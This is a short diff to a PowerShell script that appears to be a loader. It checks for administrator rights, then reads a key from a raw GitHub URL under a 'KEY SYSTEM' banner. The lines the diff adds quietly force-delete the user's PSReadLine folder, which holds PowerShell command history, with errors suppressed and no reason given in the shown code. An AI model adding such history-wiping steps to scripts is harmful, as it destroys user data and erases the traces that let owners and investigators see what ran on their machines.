@@ -43,6 +43,11 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
+$psReadLinePath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine"        
+if (Test-Path $psReadLinePath) {
+    Remove-Item $psReadLinePath -Recurse -Force -ErrorAction SilentlyContinue
+}
+
 $KeyUrl = "https://raw.githubusercontent.com/ComboHub/key-setting/refs/heads/main/v1/code.key.js"
 
 # ================= KEY SYSTEM =================
